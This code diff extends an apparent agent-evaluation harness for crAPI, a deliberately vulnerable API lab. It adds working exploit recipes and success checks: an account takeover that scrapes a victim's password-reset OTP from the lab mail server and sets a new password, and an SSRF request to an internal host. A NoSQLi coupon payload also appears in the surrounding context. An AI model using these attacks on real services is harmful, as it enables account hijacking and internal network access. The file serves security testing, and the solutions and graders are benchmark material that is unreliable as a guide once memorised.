@@ -218,6 +218,56 @@ def _nosqli_coupon(agent):
                  {"coupon_code": {"$ne": ""}}, attacker["token"])
 
 
+def _mailhog_otp(email: str, tries: int = 10):
+    for _ in range(tries):
+        try:
+            msgs = requests.get(f"{MAILHOG}/api/v2/messages", timeout=5).json()["items"]
+        except Exception:
+            msgs = []
+        for m in msgs:
+            to = m.get("To") or []
+            addrs = [(t.get("Mailbox", "") + "@" + t.get("Domain", "")).lower()
+                     for t in to if isinstance(t, dict)]
+            if email.lower() not in addrs:
+                continue
+            raw = (m.get("Raw") or {}).get("Data", "") if isinstance(m.get("Raw"), dict) else ""
+            if "otp" not in raw.lower():
+                continue
+            plain = re.sub(r"<[^>]+>", " ", re.sub(r"=\r?\n", "", raw))
+            otp = re.search(r"otp is:?\s*([0-9]{4})", plain, re.IGNORECASE)
+            if otp:
+                return otp.group(1)
+        time.sleep(1)
+    return None
+
+
+def _password_reset(agent):
+    victim = _fresh(agent, "victim")
+    _fresh(agent, "attacker")
+    agent.step("http", {"method": "POST", "path": "/identity/api/auth/forget-password",
+                        "token": "", "body": {"email": victim["email"]}})
+    otp = _mailhog_otp(victim["email"])
+    if not otp:
+        return {"status": 0, "body": ""}
+    newpass = "Hacked!123"
+    res = agent.step("http", {"method": "POST", "path": "/identity/api/auth/v2/check-otp",
+                              "token": "", "body": {"email": victim["email"], "otp": otp,
+                                                    "password": newpass}})
+    # confirm takeover: login as the victim with the new password
+    agent.step("login", {"email": victim["email"], "password": newpass})
+    if agent.state["tokens"].get(victim["email"]):
+        res["body"] = f"password reset for {victim['email']} (login with new password OK)"
+    return res
+
+
+def _ssrf(agent):
+    attacker = _fresh(agent, "attacker")
+    return _post(agent, "/workshop/api/merchant/contact_mechanic",
+                 {"mechanic_api": "http://crapi-web/health",
+                  "repeat_request_if_failed": False, "number_of_repeats": 1},
+                 attacker["token"])
+
+
 def _unimplemented(agent):
     return {"status": 0, "body": "", "note": "not implemented"}
 
@@ -237,8 +287,9 @@ CHALLENGES: Dict[str, Dict] = {
     },
     "ch3_password_reset": {
         "goal": "reset another user's password", "category": "BrokenAuth",
-        "recipe": _unimplemented,
-        "check": lambda a, o: False,
+        "recipe": _password_reset,
+        "check": lambda a, o: o.get("status") == 200 or
+            ("password reset for" in str(o.get("body", ""))),
     },
     "ch4_excessive_exposure": {
         "goal": "leak sensitive info of other users", "category": "Exposure",
@@ -278,9 +329,10 @@ CHALLENGES: Dict[str, Dict] = {
         "check": lambda a, o: o.get("status") == 200,
     },
     "ch11_ssrf": {
-        "goal": "make the target fetch an external URL", "category": "SSRF",
-        "recipe": _unimplemented,
-        "check": lambda a, o: False,
+        "goal": "make the target fetch an attacker-supplied URL", "category": "SSRF",
+        "recipe": _ssrf,
+        "check": lambda a, o: o.get("status") == 200 and
+            "response_from_mechanic_api" in str(o.get("body", "")),
     },
     "ch12_nosqli_coupon": {
         "goal": "get free coupons (NoSQLi)", "category": "NoSQLi",
